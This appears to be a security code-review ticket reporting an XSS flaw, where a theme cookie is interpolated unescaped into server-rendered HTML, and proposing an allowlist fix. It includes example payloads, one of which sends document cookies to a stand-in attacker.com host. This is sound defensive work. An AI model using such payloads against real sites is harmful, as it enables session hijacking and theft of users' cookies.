---
status: complete
priority: p2
issue_id: 129
tags: [code-review, security, xss]
---

# Problem Statement

`hooks.server.ts` interpolates the `netz-theme` cookie value directly into the HTML string via `html.replace`. A malicious cookie value (e.g., `dark" onload="alert(1)`) could inject arbitrary HTML attributes into the rendered page, creating a stored XSS vector via cookie manipulation.

# Findings

- `frontends/wealth/src/hooks.server.ts` lines 17-19 read the `netz-theme` cookie and insert it verbatim into `html.replace`.
- The cookie value is not validated against an allowlist before interpolation.
- An attacker who can set the cookie (MITM, subdomain takeover, or compromised client) could inject HTML attributes.
- Example payload: `netz-theme=dark" onload="fetch('https://attacker.com/?c='+document.cookie)"`.
- While SvelteKit's CSP may mitigate inline script execution, attribute-based vectors (e.g., `onerror`, `onload`) can bypass CSP depending on configuration.
- The same pattern in `app.html` (issue #136) is lower risk because `localStorage.setItem` sanitizes via the attribute setter — but `html.replace` with a raw string does not.

# Proposed Solutions

Validate the cookie value against a strict allowlist before use:

```typescript
const VALID_THEMES = new Set(["dark", "light"]);
const raw = event.cookies.get("netz-theme") ?? "dark";
const theme = VALID_THEMES.has(raw) ? raw : "dark";
```

Replace the current unvalidated interpolation with the validated `theme` variable. This eliminates the injection surface entirely — invalid values silently fall back to the default theme.

# Technical Details

- **File:** `frontends/wealth/src/hooks.server.ts` lines 17-19
- **Attack vector:** Cookie manipulation → HTML attribute injection → XSS
- **Fix complexity:** 2 lines
- **Source:** security-sentinel
